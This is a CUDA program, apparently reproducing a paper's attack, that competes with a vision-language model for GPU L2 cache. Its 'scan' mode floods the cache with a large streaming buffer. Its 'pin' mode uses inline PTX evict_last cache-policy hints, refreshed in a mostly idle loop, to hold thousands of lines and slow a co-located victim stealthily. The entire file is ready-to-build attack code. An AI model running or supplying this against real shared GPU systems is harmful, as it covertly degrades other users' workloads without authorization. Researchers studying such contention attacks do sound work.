// gpu_cache_thrash.cu -- competes with a VLM for GPU L2 cache while it runs.
//
// Build:
//   nvcc -O3 -arch=sm_87 gpu_cache_thrash.cu -o gpu_cache_thrash
//
// Run:
//   ./gpu_cache_thrash scan 60 256     # brute-force: stream a 256MB buffer continuously
//   ./gpu_cache_thrash pin  60         # evict_last pinning attack, mostly idle
//
// 2 modes in the paper:
//   - "scan" continuously floods the cache with new reads ~10% victim
//     degradation
//   - "pin" uses the evict_last hint to pin a SMALL number of lines an evict_last line
//     ; gets evicted after ~108 idle cycles= short
//     refresh keeps it pinned ; paper stats were idle ~97.75% of the time 
//
// createpolicy syntax matches the paper's own Listing 1:
//   createpolicy.range.L2::evict_last.b64 cache_policy, [addr], 128, 128;
//   ld.global.L2::cache_hint.u64 val, [addr], cache_policy;

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <chrono>
#include <cuda_runtime.h>

#define L2_LINE_BYTES 128        // L2 sector/line size
#define PSEUDO_SET_LINES 16      // treat 16 consecutive lines as one "set"
#define PIN_PER_PSEUDO_SET 3     // matches the paper's "3 lines pinned per set"

// --- mode: scan ---------------------------------------------------------
/* scan branch: allocates a buffer sized by buffer_MB argument, fills it with junk, 
 repeatedly launches scan_kernel until the set duration ends*/
__global__ void scan_kernel(const unsigned int* buf, size_t n_words, unsigned int* sink) {
    size_t tid = blockIdx.x * (size_t)blockDim.x + threadIdx.x; // thread ID 
    size_t stride = (size_t)gridDim.x * blockDim.x; // grid stride loop
    unsigned int acc = 0;
    for (size_t i = tid; i < n_words; i += stride) {
        acc += __ldcg(buf + i);   // cache at L2, evict_normal // plain cached read no evic hint 
    }
    if (acc == 0xdeadbeefu) sink[0] = acc;   
}

// --- mode: pin -----------------------------------------------------------
// One thread per pinned address: create an evict_last policy for its line, then loop
// refresh + brief idle
/*
pin branch: builds a 4MB buffer and picks out 3 addresses from every 16-line "pseudo-set" to set as evict_last; 
copies that address list to the GPU; launches pin_kernel once 
lines set to evict_normal are being used by victim's data
evict_last lines cannot be touched, latency increases with refillling evict_normal lines with victim's data
*/
__global__ void pin_kernel(unsigned long long* pin_addrs, int n_pins,
                            long long refresh_cycles, long long total_cycles,
                            unsigned long long* sink) {
    int tid = blockIdx.x * blockDim.x + threadIdx.x;
    if (tid >= n_pins) return;

    unsigned long long addr = pin_addrs[tid];
    unsigned long long policy;
    asm volatile("createpolicy.range.L2::evict_last.b64 %0, [%1], 128, 128;" // 128 = cache line size
                 : "=l"(policy) : "l"(addr));

    unsigned long long val = 0;
    long long elapsed = 0;
    long long t_start = clock64();

    // time to attack: one thread per address to pin 
    // creates eviction priority policy 

    //1) reloads each address with new policy 2) refreshes each time >> waste time and increase idle/latency
    while (elapsed < total_cycles) {
        asm volatile("ld.global.L2::cache_hint.u64 %0, [%1], %2;" 
                     : "=l"(val) : "l"(addr), "l"(policy));

        // keeps the paper's ~108-cycle eviction window from expiring
        long long wait_start = clock64();
        while (clock64() - wait_start < refresh_cycles) { /* spin: mostly idle on purpose */ }

        elapsed = clock64() - t_start;
    }
    if (val == 0xdeadbeefULL) sink[0] = val;   // anti-optimization guard
}

int main(int argc, char** argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage:\n  %s scan <seconds> [buffer_MB]\n  %s pin <seconds> [gpu_mhz] [refresh_cycles]\n",
                argv[0], argv[0]);
        return 1;
    }
    const char* mode = argv[1];
    int sms = 0;
    cudaDeviceGetAttribute(&sms, cudaDevAttrMultiProcessorCount, 0);

    if (strcmp(mode, "scan") == 0) {
        double seconds = argc > 2 ? atof(argv[2]) : 60;
        size_t mb = argc > 3 ? (size_t)atoi(argv[3]) : 256;
        
        //allocates buffer size 
        //launches scan_kernel
        size_t n_words = mb * 1024 * 1024 / sizeof(unsigned int);
        unsigned int *buf, *sink;
        cudaMalloc(&buf, n_words * sizeof(unsigned int));
        cudaMalloc(&sink, sizeof(unsigned int));
        cudaMemset(buf, 1, n_words * sizeof(unsigned int));

        int blocks = sms * 4, threads = 256;
        printf("scan mode: %.0fs, %zu MB buffer, %d blocks x %d threads (continuous)\n",
               seconds, mb, blocks, threads);

        auto t0 = std::chrono::steady_clock::now(); //relaunches scan kernel //records how much time has passed since t0
        long passes = 0; //records a timestamp
        while (std::chrono::duration<double>(std::chrono::steady_clock::now() - t0).count() < seconds) { //converts to seconds
            scan_kernel<<<blocks, threads>>>(buf, n_words, sink);
            cudaDeviceSynchronize();
            passes++;
        }
        printf("Done: %ld passes.\n", passes);
        cudaFree(buf);
        cudaFree(sink);

        // builds a 4MB buffer and picks out 3 addresses from every 16-line "pseudo-set" to pin

    } else if (strcmp(mode, "pin") == 0) {
        double seconds = argc > 2 ? atof(argv[2]) : 60;
        double gpu_mhz = argc > 3 ? atof(argv[3]) : 900.0;   
        long long refresh_cycles = argc > 4 ? atoll(argv[4]) : 80;
        long long total_cycles = (long long)(seconds * gpu_mhz * 1e6);

        //make buffer with 128byte lines
        size_t buf_mb = 4; // 4MB buffer
        size_t buf_bytes = buf_mb * 1024 * 1024;  // 4,194,304 bytes
        size_t n_lines = buf_bytes / L2_LINE_BYTES;  // 4,194,304 / 128 = 32,768 lines total
        size_t n_pseudo_sets = n_lines / PSEUDO_SET_LINES; // 32,768 / 16 = 2,048 pseudo-sets
        int n_pins = (int)(n_pseudo_sets * PIN_PER_PSEUDO_SET); // 2,048 * 3 = 6,144 pins total

        unsigned char* buf;
        cudaMalloc(&buf, buf_bytes);
        cudaMemset(buf, 1, buf_bytes);

        //copies that address list to the GPU //launches pin_kernel 
    
        unsigned long long* h_addrs = (unsigned long long*)malloc(n_pins * sizeof(unsigned long long));
        int idx = 0;
        for (size_t s = 0; s < n_pseudo_sets; s++) {
            for (int k = 0; k < PIN_PER_PSEUDO_SET; k++) {
                size_t line = s * PSEUDO_SET_LINES + k;
                h_addrs[idx++] = (unsigned long long)(buf + line * L2_LINE_BYTES);
            }
        }

        unsigned long long *d_addrs, *sink;
        cudaMalloc(&d_addrs, n_pins * sizeof(unsigned long long));
        cudaMalloc(&sink, sizeof(unsigned long long));
        cudaMemcpy(d_addrs, h_addrs, n_pins * sizeof(unsigned long long), cudaMemcpyHostToDevice);

        int threads = 256;
        int blocks = (n_pins + threads - 1) / threads;

        printf("pin mode: %.0fs, pinning %d lines (%d per %d-line pseudo-set) across %zu MB, "
               "refresh every %lld cycles (~%.0f MHz assumed)\n",
               seconds, n_pins, PIN_PER_PSEUDO_SET, PSEUDO_SET_LINES, buf_mb, refresh_cycles, gpu_mhz);
        printf("NOTE: pseudo-set grouping is an approximation of real L2 sets.\n");

        pin_kernel<<<blocks, threads>>>(d_addrs, n_pins, refresh_cycles, total_cycles, sink); //launch pin kernel
        cudaDeviceSynchronize();

        cudaError_t err = cudaGetLastError();
        if (err != cudaSuccess) printf("CUDA error: %s\n", cudaGetErrorString(err));
        else printf("Done.\n");

        free(h_addrs);
        cudaFree(buf);
        cudaFree(d_addrs);
        cudaFree(sink);

    } else {
        fprintf(stderr, "Unknown mode '%s'. Use 'scan' or 'pin'.\n", mode);
        return 1;
    }

    return 0;
}
